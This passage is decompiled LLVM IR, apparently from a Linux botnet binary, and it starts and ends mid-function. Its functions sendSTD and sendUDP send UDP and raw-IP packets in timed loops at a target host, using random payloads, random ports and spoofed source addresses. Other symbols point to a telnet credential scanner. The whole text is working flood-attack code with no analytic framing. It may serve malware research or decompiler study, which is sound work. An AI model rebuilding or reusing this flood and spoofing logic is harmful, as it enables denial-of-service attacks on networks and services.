  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 39, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32* %eax.global-to-local, { 201, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 81, 79, 80, 82, 83, 76, 84, 85, 86, 87, 88, 89, 91, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 113, 116, 114, 115, 117, 118, 111, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 179, 194, 195, 196, 197, 198, 199, 200, 223, 202, 203, 216, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 224, 217, 218, 219, 220, 221, 222 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 513, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d8eb, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804c9f7, { 1, 0 }
  uselistorder label %dec_label_pc_804c9a8, { 1, 0 }
  uselistorder label %dec_label_pc_804c99c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c98b, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_804d912 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804d922 = call i32 @__GI_time(i32* null)
  %v1_804d934 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804d93f = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_804d960 = add i32 %v1_804d934, 12
  %v2_804d960 = inttoptr i32 %v1_804d960 to i32*
  %v3_804d960 = load i32, i32* %v2_804d960, align 4
  %v2_804d968 = ptrtoint i32* %stack_var_-40 to i32
  %v1_804d96e = add i32 %v1_804d934, 16
  %v2_804d96e = inttoptr i32 %v1_804d96e to i32*
  %v3_804d96e = load i32, i32* %v2_804d96e, align 4
  %v1_804d971 = inttoptr i32 %v3_804d96e to i32*
  %v2_804d971 = load i32, i32* %v1_804d971, align 4
  %v4_804d979 = call i32 @bcopy(i32 %v2_804d971, i32 %v2_804d968, i32 %v3_804d960)
  %v1_804d984 = add i32 %v1_804d934, 8
  %v2_804d984 = inttoptr i32 %v1_804d984 to i32*
  %v3_804d984 = load i32, i32* %v2_804d984, align 4
  store i32 %v3_804d984, i32* %stack_var_-44, align 4
  %v4_804d9af = bitcast i32* %stack_var_-188 to i16*
  %v5_804da3a = add i32 %v2_804d922, %arg3
  br label %dec_label_pc_804d999

dec_label_pc_804d999:                             ; preds = %dec_label_pc_804da60, %entry
  %storemerge = phi i32 [ %v4_804da60, %dec_label_pc_804da60 ], [ 0, %entry ]
  %v5_804d9af = call i32 @memcpy(i16* %v4_804d9af, i32 ptrtoint ([36 x i8*]* @global_var_8058b40.302 to i32), i32 144)
  store i32 %v5_804d9af, i32* @eax, align 4
  %v0_804d9b7 = call i32 @random()
  %v2_804d9c7 = udiv i32 %v0_804d9b7, 36
  %tmp = mul nsw i32 %v2_804d9c7, -4
  %v2_804d9e4 = add i32 %v0_804d9b7, %tmp
  store i32 %v2_804d9e4, i32* @ebx, align 4
  %tmp31 = icmp ult i32 %storemerge, 50
  br i1 %tmp31, label %dec_label_pc_804d999.dec_label_pc_804da60_crit_edge, label %dec_label_pc_804da02

dec_label_pc_804d999.dec_label_pc_804da60_crit_edge: ; preds = %dec_label_pc_804d999
  br label %dec_label_pc_804da60

dec_label_pc_804da02:                             ; preds = %dec_label_pc_804d999
  %v0_804d9f2 = load i32, i32* @ebp, align 4
  %v3_804d9f2 = add i32 %v0_804d9f2, -184
  %v2_804d9f2 = mul i32 %v2_804d9e4, 4
  %v4_804d9f2 = add i32 %v3_804d9f2, %v2_804d9f2
  %v5_804d9f2 = inttoptr i32 %v4_804d9f2 to i32*
  %v6_804d9f2 = load i32, i32* %v5_804d9f2, align 4
  %v5_804da0c = call i32 @__libc_send(i32 %v4_804d912, i32 %v6_804d9f2, i32 65, i32 0)
  %v4_804da20 = call i32 @__libc_connect(i32 %v4_804d912, i32 %v2_804d93f, i32 16)
  %v2_804da2d = call i32 @__GI_time(i32* null)
  %v5_804da3f = icmp slt i32 %v2_804da2d, %v5_804da3a
  br i1 %v5_804da3f, label %dec_label_pc_804da60, label %dec_label_pc_804da41

dec_label_pc_804da41:                             ; preds = %dec_label_pc_804da02
  %v1_804da47 = call i32 @__libc_close(i32 %v4_804d912)
  %v1_804da54 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804da60:                             ; preds = %dec_label_pc_804d999.dec_label_pc_804da60_crit_edge, %dec_label_pc_804da02
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804d999.dec_label_pc_804da60_crit_edge ], [ 0, %dec_label_pc_804da02 ]
  %v4_804da60 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804d999

; uselistorder directives
  uselistorder i32 %v2_804d9e4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804d934, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 144, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_804da60, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp41 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_804da6c = load i32, i32* @ebx, align 4
  %v12_804da6d = ptrtoint i32* %stack_var_-124 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804da76 = icmp eq i32 %arg2, 0
  %v1_804da7a = icmp eq i1 %v4_804da76, false
  br i1 %v1_804da7a, label %dec_label_pc_804da87, label %dec_label_pc_804da7c

dec_label_pc_804da7c:                             ; preds = %entry
  %v1_804da7c = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804da9f

dec_label_pc_804da87:                             ; preds = %entry
  %v1_804da8a = urem i32 %arg2, 65536
  store i32 %v1_804da8a, i32* %eax.global-to-local, align 4
  %v1_804da93 = call i32 @htons(i32 %v1_804da8a)
  br label %dec_label_pc_804da9f

dec_label_pc_804da9f:                             ; preds = %dec_label_pc_804da7c, %dec_label_pc_804da87
  %v2_804daa2 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804daa5 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804daa5, i32* %eax.global-to-local, align 4
  %v4_804daac = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804daac, i32* %eax.global-to-local, align 4
  %v1_804dab4 = icmp eq i32 %v4_804daac, 0
  %v1_804dab6 = icmp eq i1 %v1_804dab4, false
  br i1 %v1_804dab6, label %dec_label_pc_804df52, label %dec_label_pc_804dabc

dec_label_pc_804dabc:                             ; preds = %dec_label_pc_804da9f
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804dad5 = icmp eq i32 %arg4, 32
  %v1_804dad9 = icmp eq i1 %v9_804dad5, false
  br i1 %v1_804dad9, label %dec_label_pc_804dc11, label %dec_label_pc_804dadf

dec_label_pc_804dadf:                             ; preds = %dec_label_pc_804dabc
  %v4_804dae8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804dae8, i32* %eax.global-to-local, align 4
  %v4_804daf3 = icmp eq i32 %v4_804dae8, 0
  %v1_804daf7 = icmp eq i1 %v4_804daf3, false
  br i1 %v1_804daf7, label %dec_label_pc_804db14, label %dec_label_pc_804daf9

dec_label_pc_804daf9:                             ; preds = %dec_label_pc_804dadf
  %v0_804daf9 = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804daf9, i32* %eax.global-to-local, align 4
  %v3_804db07 = call i32 @sockprintf(i32 %v0_804daf9, i32 ptrtoint ([27 x i8]* @global_var_8058bd0.303 to i32))
  store i32 %v3_804db07, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df52

dec_label_pc_804db14:                             ; preds = %dec_label_pc_804dadf
  %v1_804db17 = add i32 %arg5, 1
  store i32 %v1_804db17, i32* %eax.global-to-local, align 4
  %v1_804db1c = call i32 @malloc(i32 %v1_804db17)
  store i32 %v1_804db1c, i32* %eax.global-to-local, align 4
  %v4_804db27 = icmp eq i32 %v1_804db1c, 0
  br i1 %v4_804db27, label %dec_label_pc_804df52, label %dec_label_pc_804db31

dec_label_pc_804db31:                             ; preds = %dec_label_pc_804db14
  store i32 %v1_804db17, i32* %edx.global-to-local, align 4
  %v1_804db3a = inttoptr i32 %v1_804db1c to i8*
  store i32 %v1_804db1c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804db3f = and i32 %v1_804db1c, -256
  store i32 %v1_804db3f, i32* %eax.global-to-local, align 4
  %v5_804db41 = call i8* @_memset(i8* %v1_804db3a, i32 %v1_804db3f, i32 %v1_804db17)
  %v3_804db49 = call i32 @makeRandomStr(i8* %v1_804db3a, i32 %arg5)
  store i32 %v3_804db49, i32* %eax.global-to-local, align 4
  %v2_804db56 = call i32 @__GI_time(i32* null)
  %v5_804db5e = add i32 %v2_804db56, %arg3
  store i32 %v5_804db5e, i32* %eax.global-to-local, align 4
  %v1_804dbe5 = mul i32 %arg8, 100
  %v2_804dbee = mul i32 %arg8, 1000
  %v1_804dbf5 = sext i32 %v2_804dbee to i64
  br label %dec_label_pc_804db74.outer

dec_label_pc_804db74.outer:                       ; preds = %dec_label_pc_804dbd2, %dec_label_pc_804dc09, %dec_label_pc_804db31
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804db31 ], [ 0, %dec_label_pc_804dbd2 ], [ %v4_804dc09, %dec_label_pc_804dc09 ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804db31 ], [ %v4_804dbc7, %dec_label_pc_804dbd2 ], [ %v4_804dbc7, %dec_label_pc_804dc09 ]
  br label %dec_label_pc_804db74

dec_label_pc_804db74:                             ; preds = %dec_label_pc_804db74.outer, %dec_label_pc_804dba8
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804dba8 ], [ %stack_var_-92.0.ph, %dec_label_pc_804db74.outer ]
  store i32 %v2_804daa2, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804dae8, i32* %stack_var_-156, align 4
  %v7_804db89 = call i32 @__libc_sendto(i32 %v4_804dae8, i32 %v1_804db1c, i32 %arg5, i32 0, i32 %v2_804daa2, i32 16)
  store i32 %v7_804db89, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804db94 = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804db97 = icmp eq i1 %v15_804db94, false
  br i1 %v1_804db97, label %dec_label_pc_804dbc7, label %dec_label_pc_804db99

dec_label_pc_804db99:                             ; preds = %dec_label_pc_804db74
  br i1 %v1_804da7a, label %dec_label_pc_804dba8, label %dec_label_pc_804db9f

dec_label_pc_804db9f:                             ; preds = %dec_label_pc_804db99
  %v0_804db9f = load i32, i32* %stack_var_-156, align 4
  %v1_804db9f = call i32 @rand_cmwc(i32 %v0_804db9f)
  store i32 %v1_804db9f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dba8

dec_label_pc_804dba8:                             ; preds = %dec_label_pc_804db99, %dec_label_pc_804db9f
  %v2_804dbad = call i32 @__GI_time(i32* null)
  store i32 %v2_804dbad, i32* %eax.global-to-local, align 4
  %v8_804dbb8 = icmp sgt i32 %v2_804dbad, %v5_804db5e
  br i1 %v8_804dbb8, label %dec_label_pc_804df52, label %dec_label_pc_804db74

dec_label_pc_804dbc7:                             ; preds = %dec_label_pc_804db74
  %v4_804dbc7 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804dbcd = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804dbd0 = icmp eq i1 %v15_804dbcd, false
  br i1 %v1_804dbd0, label %dec_label_pc_804dc09, label %dec_label_pc_804dbd2

dec_label_pc_804dbd2:                             ; preds = %dec_label_pc_804dbc7
  store i32 %v1_804dbe5, i32* %edx.global-to-local, align 4
  store i32 %v2_804dbee, i32* %eax.global-to-local, align 4
  %v2_804dbf5 = call i32 @usleep(i64 %v1_804dbf5)
  store i32 %v2_804dbf5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804db74.outer

dec_label_pc_804dc09:                             ; preds = %dec_label_pc_804dbc7
  %v4_804dc09 = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804db74.outer

dec_label_pc_804dc11:                             ; preds = %dec_label_pc_804dabc
  store i32 %v12_804da6d, i32* %eax.global-to-local, align 4
  %v4_804dc1f = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804dc1f, i32* %eax.global-to-local, align 4
  %v4_804dc2a = icmp eq i32 %v4_804dc1f, 0
  %v1_804dc2e = icmp eq i1 %v4_804dc2a, false
  br i1 %v1_804dc2e, label %dec_label_pc_804dc4b, label %dec_label_pc_804dc30

dec_label_pc_804dc30:                             ; preds = %dec_label_pc_804dc11
  %v0_804dc30 = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804dc30, i32* %eax.global-to-local, align 4
  %v3_804dc3e = call i32 @sockprintf(i32 %v0_804dc30, i32 ptrtoint ([27 x i8]* @global_var_8058bd0.303 to i32))
  store i32 %v3_804dc3e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df4f

dec_label_pc_804dc4b:                             ; preds = %dec_label_pc_804dc11
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804dc57 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804dc57, i32* %eax.global-to-local, align 4
  store i32 %v4_804dc1f, i32* %stack_var_-156, align 4
  %v5_804dc62 = call i32 @__GI_setsockopt(i32 %v4_804dc1f, i32 0, i32 3, i32 %v2_804dc57, i32 4)
  store i32 %v5_804dc62, i32* %eax.global-to-local, align 4
  %v2_804dc6a = icmp slt i32 %v5_804dc62, 0
  %v1_804dc6c = icmp eq i1 %v2_804dc6a, false
  br i1 %v1_804dc6c, label %dec_label_pc_804dcc2.preheader, label %dec_label_pc_804dc6e

dec_label_pc_804dcc2.preheader:                   ; preds = %dec_label_pc_804dc4b
  br label %dec_label_pc_804dc92

dec_label_pc_804dc6e:                             ; preds = %dec_label_pc_804dc4b
  %v0_804dc6e = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804dc6e, i32* %eax.global-to-local, align 4
  %v3_804dc7c = call i32 @sockprintf(i32 %v0_804dc6e, i32 ptrtoint ([33 x i8]* @global_var_8058bec.304 to i32))
  store i32 %v3_804dc7c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df4f

dec_label_pc_804dc92:                             ; preds = %dec_label_pc_804dcc2.preheader, %dec_label_pc_804dc92
  %stack_var_-32.088 = phi i32 [ 50, %dec_label_pc_804dcc2.preheader ], [ %v4_804dcc2, %dec_label_pc_804dc92 ]
  %v4_804dcc2 = add nsw i32 %stack_var_-32.088, -1
  %v2_804dc97 = call i32 @__GI_time(i32* null)
  store i32 %v2_804dc97, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc97, i32* @ebx, align 4
  %v1_804dca1 = call i32 @rand_cmwc(i32 0)
  %v1_804dca6 = load i32, i32* @ebx, align 4
  %v2_804dca6 = xor i32 %v1_804dca6, %v1_804dca1
  store i32 %v2_804dca6, i32* @eax, align 4
  %v1_804dcac = call i32 @srand(i32 %v2_804dca6)
  store i32 %v1_804dcac, i32* @eax, align 4
  %v0_804dcb4 = call i32 @random()
  store i32 %v0_804dcb4, i32* %eax.global-to-local, align 4
  %v1_804dcba = call i32 @init_rand(i32 %v0_804dcb4)
  store i32 %v1_804dcba, i32* %eax.global-to-local, align 4
  %v13_804dcc5 = icmp eq i32 %v4_804dcc2, 0
  %v1_804dcc9 = icmp eq i1 %v13_804dcc5, false
  br i1 %v1_804dcc9, label %dec_label_pc_804dc92, label %dec_label_pc_804dccb

dec_label_pc_804dccb:                             ; preds = %dec_label_pc_804dc92
  %v4_804dccb = icmp eq i32 %arg4, 0
  %v1_804dccf = icmp eq i1 %v4_804dccb, false
  br i1 %v1_804dccf, label %dec_label_pc_804dcda, label %dec_label_pc_804dcf0

dec_label_pc_804dcda:                             ; preds = %dec_label_pc_804dccb
  %v5_804dce1 = sub i32 32, %arg4
  %v2_804dce9 = urem i32 %v5_804dce1, 32
  %v4_804dce9 = icmp eq i32 %v2_804dce9, 0
  br i1 %v4_804dce9, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804dcda
  %v5_804dce9 = shl i32 1, %v2_804dce9
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804dcda, %bb
  %v0_804dceb = phi i32 [ %v5_804dce9, %bb ], [ 1, %dec_label_pc_804dcda ]
  %v1_804dceb = sub i32 0, %v0_804dceb
  store i32 %v1_804dceb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dcf0

dec_label_pc_804dcf0:                             ; preds = %dec_label_pc_804dccb, %bb84
  %storemerge6 = phi i32 [ %v1_804dceb, %bb84 ], [ 0, %dec_label_pc_804dccb ]
  %v1_804dcf3 = add i32 %arg5, 28
  %v1_804dcff = add i32 %arg5, 58
  %v2_804dd02 = and i32 %v1_804dcff, -16
  %v2_804dd08 = sub i32 %v12_804da6d, %v2_804dd02
  %v1_804dd10 = add i32 %v2_804dd08, 15
  %v2_804dd13 = and i32 %v1_804dd10, -16
  %v1_804dd2b = add i32 %v2_804dd13, 20
  %v5_804dd2e = inttoptr i32 %v1_804dd2b to i16*
  %v1_804dd34 = add i32 %arg5, 8
  store i32 %v1_804dd34, i32* %eax.global-to-local, align 4
  store i32 %v1_804dd34, i32* @ebx, align 4
  %v5_804dd3c = add i32 %v2_804dd08, -16
  %v6_804dd3c = inttoptr i32 %v5_804dd3c to i32*
  store i32 %storemerge6, i32* %v6_804dd3c, align 4
  %v2_804dd3f = call i32 @GetRandomIP(i32 %v1_804dcf3, i32 %v2_804dd13)
  store i32 %v2_804dd3f, i32* %eax.global-to-local, align 4
  %v0_804dd44 = load i32, i32* @esp, align 4
  %v3_804dd4a = inttoptr i32 %v0_804dd44 to i32*
  store i32 %v2_804dd3f, i32* %v3_804dd4a, align 4
  %v0_804dd4b = call i32 @htonl()
  store i32 %v0_804dd4b, i32* %eax.global-to-local, align 4
  %v0_804dd50 = load i32, i32* @esp, align 4
  %v3_804dd53 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804dd53, i32* %edx.global-to-local, align 4
  %v0_804dd59 = load i32, i32* @ebx, align 4
  %v2_804dd59 = add i32 %v0_804dd50, 8
  %v3_804dd59 = inttoptr i32 %v2_804dd59 to i32*
  store i32 %v0_804dd59, i32* %v3_804dd59, align 4
  %v1_804dd5a = add i32 %v0_804dd50, 4
  %v2_804dd5a = inttoptr i32 %v1_804dd5a to i32*
  store i32 17, i32* %v2_804dd5a, align 4
  %v3_804dd5c = inttoptr i32 %v0_804dd50 to i32*
  store i32 %v0_804dd4b, i32* %v3_804dd5c, align 4
  %v0_804dd5d = load i32, i32* %edx.global-to-local, align 4
  %v2_804dd5d = add i32 %v0_804dd50, -4
  %v3_804dd5d = inttoptr i32 %v2_804dd5d to i32*
  store i32 %v0_804dd5d, i32* %v3_804dd5d, align 4
  %v5_804dd5e = add i32 %v0_804dd50, -8
  %v6_804dd5e = inttoptr i32 %v5_804dd5e to i32*
  store i32 %v2_804dd13, i32* %v6_804dd5e, align 4
  %v0_804dd61 = call i32 @makeIPPacket()
  %v0_804dd66 = load i32, i32* @esp, align 4
  %v1_804dd6f = urem i32 %v1_804dd34, 65536
  store i32 %v1_804dd6f, i32* %eax.global-to-local, align 4
  %v2_804dd77 = add i32 %v0_804dd66, 8
  %v3_804dd77 = inttoptr i32 %v2_804dd77 to i32*
  store i32 %v1_804dd6f, i32* %v3_804dd77, align 4
  %v2_804dd78 = call i32 @htons(i32 %v1_804dd2b)
  %v3_804dd78 = trunc i32 %v2_804dd78 to i16
  %sext7 = mul i32 %v2_804dd78, 65536
  %v1_804dd80 = sdiv i32 %sext7, 65536
  store i32 %v1_804dd80, i32* %edx.global-to-local, align 4
  store i32 %v1_804dd2b, i32* %eax.global-to-local, align 4
  %v3_804dd85 = add i32 %v2_804dd13, 24
  %v4_804dd85 = inttoptr i32 %v3_804dd85 to i16*
  store i16 %v3_804dd78, i16* %v4_804dd85, align 8
  %v2_804dd89 = call i32 @rand_cmwc(i32 %v1_804dd2b)
  %sext = mul i32 %v2_804dd89, 65536
  %v1_804dd8e = sdiv i32 %sext, 65536
  store i32 %v1_804dd8e, i32* %edx.global-to-local, align 4
  store i32 %v1_804dd2b, i32* %eax.global-to-local, align 4
  %v1_804dd93 = trunc i32 %v1_804dd8e to i16
  store i16 %v1_804dd93, i16* %v5_804dd2e, align 4
  br i1 %v1_804da7a, label %dec_label_pc_804dda7, label %dec_label_pc_804dd9c

dec_label_pc_804dd9c:                             ; preds = %dec_label_pc_804dcf0
  %v2_804dd9c = call i32 @rand_cmwc(i32 %v1_804dd2b)
  store i32 %v2_804dd9c, i32* %eax.global-to-local, align 4
  %.pre37 = urem i32 %arg2, 65536
  br label %dec_label_pc_804ddbf

dec_label_pc_804dda7:                             ; preds = %dec_label_pc_804dcf0
  %v1_804ddaa = urem i32 %arg2, 65536
  store i32 %v1_804ddaa, i32* %eax.global-to-local, align 4
  %v0_804ddaf = load i32, i32* @esp, align 4
  %v2_804ddb2 = add i32 %v0_804ddaf, -16
  %v3_804ddb2 = inttoptr i32 %v2_804ddb2 to i32*
  store i32 %v1_804ddaa, i32* %v3_804ddb2, align 4
  %v1_804ddb3 = sext i16 %tmp41 to i32
  %v2_804ddb3 = call i32 @htons(i32 %v1_804ddb3)
  store i32 %v2_804ddb3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ddbf

dec_label_pc_804ddbf:                             ; preds = %dec_label_pc_804dd9c, %dec_label_pc_804dda7
  %v1_804de6a.pre-phi = phi i32 [ %.pre37, %dec_label_pc_804dd9c ], [ %v1_804ddaa, %dec_label_pc_804dda7 ]
  %storemerge5.in = phi i32 [ %v2_804dd9c, %dec_label_pc_804dd9c ], [ %v2_804ddb3, %dec_label_pc_804dda7 ]
  %storemerge5 = trunc i32 %storemerge5.in to i16
  %sext8 = mul i32 %storemerge5.in, 65536
  %v4_804ddc2 = sdiv i32 %sext8, 65536
  store i32 %v4_804ddc2, i32* %edx.global-to-local, align 4
  %v3_804ddc5 = add i32 %v2_804dd13, 22
  %v4_804ddc5 = inttoptr i32 %v3_804ddc5 to i16*
  store i16 %storemerge5, i16* %v4_804ddc5, align 2
  %v1_804ddcc = add i32 %v2_804dd13, 26
  %v2_804ddcc = inttoptr i32 %v1_804ddcc to i16*
  store i16 0, i16* %v2_804ddcc, align 2
  %v1_804ddd5 = add i32 %v2_804dd13, 28
  store i32 %v1_804ddd5, i32* %eax.global-to-local, align 4
  %v4_804ddd8 = load i32, i32* @esp, align 4
  %v5_804ddd8 = add i32 %v4_804ddd8, -4
  %v6_804ddd8 = inttoptr i32 %v5_804ddd8 to i32*
  store i32 %arg5, i32* %v6_804ddd8, align 4
  %v0_804dddb = load i32, i32* %eax.global-to-local, align 4
  %v2_804dddb = add i32 %v4_804ddd8, -8
  %v3_804dddb = inttoptr i32 %v2_804dddb to i32*
  store i32 %v0_804dddb, i32* %v3_804dddb, align 4
  %v3_804dddc = inttoptr i32 %v4_804ddc2 to i8*
  %v4_804dddc = call i32 @makeRandomStr(i8* %v3_804dddc, i32 %v12_804da6d)
  %v0_804dde1 = load i32, i32* @esp, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v1_804dde7 = or i32 %v2_804dd13, 2
  %v2_804dde7 = inttoptr i32 %v1_804dde7 to i16*
  %v3_804dde7 = load i16, i16* %v2_804dde7, align 2
  %v4_804dde7 = zext i16 %v3_804dde7 to i32
  store i32 %v4_804dde7, i32* %edx.global-to-local, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v2_804ddf6 = add i32 %v0_804dde1, 4
  %v3_804ddf6 = inttoptr i32 %v2_804ddf6 to i32*
  store i32 %v4_804dde7, i32* %v3_804ddf6, align 4
  %v0_804ddf7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ddf7 = inttoptr i32 %v0_804dde1 to i32*
  store i32 %v0_804ddf7, i32* %v3_804ddf7, align 4
  %v3_804ddf8 = inttoptr i32 %v4_804ddc2 to i16*
  %v4_804ddf8 = call i32 @csum(i16* %v3_804ddf8, i32 %v12_804da6d)
  %v5_804ddf8 = trunc i32 %v4_804ddf8 to i16
  %sext11 = mul i32 %v4_804ddf8, 65536
  %v1_804de00 = sdiv i32 %sext11, 65536
  store i32 %v1_804de00, i32* %edx.global-to-local, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v3_804de05 = or i32 %v2_804dd13, 10
  %v4_804de05 = inttoptr i32 %v3_804de05 to i16*
  store i16 %v5_804ddf8, i16* %v4_804de05, align 2
  %v0_804de09 = load i32, i32* @esp, align 4
  %v1_804de0c = add i32 %v0_804de09, -16
  %v2_804de0c = inttoptr i32 %v1_804de0c to i32*
  store i32 0, i32* %v2_804de0c, align 4
  %v2_804de0e = inttoptr i32 %v4_804ddc2 to i32*
  %v3_804de0e = call i32 @__GI_time(i32* %v2_804de0e)
  %v0_804de13 = load i32, i32* @esp, align 4
  %v1_804de13 = add i32 %v0_804de13, 16
  %v5_804de16 = add i32 %v3_804de0e, %arg3
  store i32 %v5_804de16, i32* %eax.global-to-local, align 4
  %v3_804de94 = or i32 %v2_804dd13, 4
  %v4_804de94 = inttoptr i32 %v3_804de94 to i16*
  %v2_804deb7 = or i32 %v2_804dd13, 12
  %v3_804deb7 = inttoptr i32 %v2_804deb7 to i32*
  %v1_804df23 = mul i32 %arg8, 100
  %v2_804df2c = mul i32 %arg8, 1000
  br label %dec_label_pc_804de2c.outer

dec_label_pc_804de2c.outer:                       ; preds = %dec_label_pc_804df10, %dec_label_pc_804df47, %dec_label_pc_804ddbf
  %v0_804de32.pre = phi i32 [ %v1_804de13, %dec_label_pc_804ddbf ], [ %v1_804df38, %dec_label_pc_804df10 ], [ %v0_804de32.pre.pre.pre, %dec_label_pc_804df47 ]
  %stack_var_-102.0.ph = phi i16 [ %tmp, %dec_label_pc_804ddbf ], [ %storemerge, %dec_label_pc_804df10 ], [ %storemerge, %dec_label_pc_804df47 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804ddbf ], [ 0, %dec_label_pc_804df10 ], [ %v4_804df47, %dec_label_pc_804df47 ]
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804ddbf ], [ %v4_804df05, %dec_label_pc_804df10 ], [ %v4_804df05, %dec_label_pc_804df47 ]
  br label %dec_label_pc_804de2c

dec_label_pc_804de2c:                             ; preds = %dec_label_pc_804de2c.outer, %dec_label_pc_804dee7
  %v0_804de32 = phi i32 [ %v1_804def1, %dec_label_pc_804dee7 ], [ %v0_804de32.pre, %dec_label_pc_804de2c.outer ]
